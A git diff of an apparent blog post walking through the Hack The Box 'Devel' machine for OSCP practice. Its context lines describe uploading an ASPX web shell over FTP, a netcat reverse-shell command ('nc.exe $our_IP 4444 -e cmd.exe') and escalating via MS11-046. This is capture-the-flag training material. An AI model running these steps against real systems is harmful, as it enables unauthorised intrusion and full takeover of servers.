@@ -5,7 +5,7 @@ published: true
 
 Hi, this is my write up for the easy box **Devel** on Hackthebox. This is a retired windows machine and can be easily exploited in a matter of minutes is Metasploit. However, as this is for OSCP preparation, no metasploit will be used.
 
-![devel_graphi]({{site.baseurl}}/_posts/devel_graphic.PNG)
+![devel_graphi](/images/posts/devel_graphic.PNG)
 
 If you enjoyed this write up feel free to follow me on twitter. Let's get started!! :)
 
@@ -63,11 +63,11 @@ ___
 
 Accessing the web page we notice that this is indeed a default test page when configuring IIS:
 
-![default_test_page]({{site.baseurl}}/_posts/2021-02-02 15_57_40-Window.png)
+![default_test_page](/images/2021-02-02 15_57_40-Window.png)
 
 If we look at the sourcecode we can see the welcome.png file is hosted locally on the server:
 
-![2021-02-02 16_03_57-Window.png]({{site.baseurl}}/_posts/2021-02-02 16_03_57-Window.png)
+![2021-02-02 16_03_57-Window.png](/images/2021-02-02 16_03_57-Window.png)
 
 We can run other tools like dirbuster etc but this information has lead to me to believe FTP is the path we should pursue...
 
@@ -125,7 +125,7 @@ To test this we create a file called test.txt and upload this to the server via 
 
 The file has been successfully uploaded. Let's try and access this via the browser:
 
-![2021-02-02 16_19_18-Window.png]({{site.baseurl}}/_posts/2021-02-02 16_19_18-Window.png)
+![2021-02-02 16_19_18-Window.png](/images/2021-02-02 16_19_18-Window.png)
 
 So we now know we can access any resource we upload via FTP from the browser. This means if we were to set upload a reverse shell via FTP access it via FTP, we can setup a call back and get a shell. Let's try this.
 
@@ -146,7 +146,7 @@ Kali linux has inbuilt web shells for .ASPX which can be located at **/usr/share
 
 There are **NO** changes to be made to file. Upload this file via FTP and then access the resource through the browser:
 
-![2021-02-02 16_31_45-Window.png]({{site.baseurl}}/_posts/2021-02-02 16_31_45-Window.png)
+![2021-02-02 16_31_45-Window.png](/images/2021-02-02 16_31_45-Window.png)
 
 
 This is will allow us to run **windows commands** via a HTML page as can be seen above when running **whoami**.
@@ -170,11 +170,11 @@ We can upload netcat **(nc.exe)**, set up our listener and get a callback. This 
 5. run nc.exe in browser to initate call back
 	- c:\inetpub\wwwroot\nc.exe $our_IP 4444 -e cmd.exe
 
-![2021-02-02 16_49_45-Window.png]({{site.baseurl}}/_posts/2021-02-02 16_49_45-Window.png)
+![2021-02-02 16_49_45-Window.png](/images/2021-02-02 16_49_45-Window.png)
 
 After doing this we should get a call back on our listener and gained our foothold:
 
-![2021-02-02 17_11_33-Window.png]({{site.baseurl}}/_posts/2021-02-02 17_11_33-Window.png)
+![2021-02-02 17_11_33-Window.png](/images/2021-02-02 17_11_33-Window.png)
 
 However we are not SYSTEM, to do this we must escalate our privileges through the means of a **local exploit**
 
@@ -205,7 +205,7 @@ This is on exploit-db so we can find it on our local kali machine using:
 	
     	searchsploit MS11-046
 
-![2021-02-02 17_24_12-Window.png]({{site.baseurl}}/_posts/2021-02-02 17_24_12-Window.png)
+![2021-02-02 17_24_12-Window.png](/images/2021-02-02 17_24_12-Window.png)
 
 1st option as the 2nd is listed a **dos** not **local**.
 
@@ -238,7 +238,7 @@ With all this now known let's test this.
 
 ...and if all went well you should now be SYSTEM
 
-![2021-02-02 17_43_54-Window.png]({{site.baseurl}}/_posts/2021-02-02 17_43_54-Window.png)
+![2021-02-02 17_43_54-Window.png](/images/2021-02-02 17_43_54-Window.png)
 
 Finally, grab your user.txt and root.txt flags to complete the box.
 
